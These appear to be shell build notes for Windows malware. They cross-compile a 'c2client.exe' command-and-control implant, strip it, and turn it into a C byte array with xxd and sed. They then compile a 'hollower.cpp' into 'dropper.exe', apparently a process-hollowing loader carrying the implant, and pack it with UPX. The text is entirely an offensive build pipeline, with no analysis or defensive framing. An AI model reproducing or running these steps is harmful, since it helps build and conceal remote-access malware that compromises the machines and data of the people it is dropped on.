#step 1
x86_64-w64-mingw32-g++ *.cpp *.h resource.o sqlite3.o \
-o ../c2client.exe \
-std=gnu++17 \
-static -static-libgcc -static-libstdc++ \
-lws2_32 -liphlpapi -lgdiplus -lgdi32 -lole32 -loleaut32 \
-luuid -lnetapi32 -lPowrProf -lcrypt32 -lbcrypt \
-lwtsapi32 -lshlwapi \
-mwindows -O3 -s -ffunction-sections -fdata-sections \
-fno-exceptions -fno-rtti -fno-stack-protector \
-Wl,--gc-sections -DNDEBUG -w

#step2
strip --strip-all c2client.exe                      

#step 3
xxd -i c2client.exe > c2client_array.h   

# 1. Nuclear sed (MULTIPLE passes)
sed -i 's/c2client_exe\[\]/c2client_array\[\]/g' c2client_array.h
sed -i 's/c2client_exe_len/c2client_array_len/g' c2client_array.h
sed -i 's/unsigned char c2client_exe/unsigned char c2client_array/g' c2client_array.h

# 2. VERIFY (MUST show array ONLY)
grep -n "c2client_" c2client_array.h | head -2
# Expected:
# 1:unsigned char c2client_array[] = {
# X:unsigned int c2client_array_len = 2696192;

           

#step 3
x86_64-w64-mingw32-g++ hollower.cpp -o dropper.exe \
  -static -O3 -s -Wl,--gc-sections -mwindows -DNDEBUG

#step 4
upx --best dropper.exe
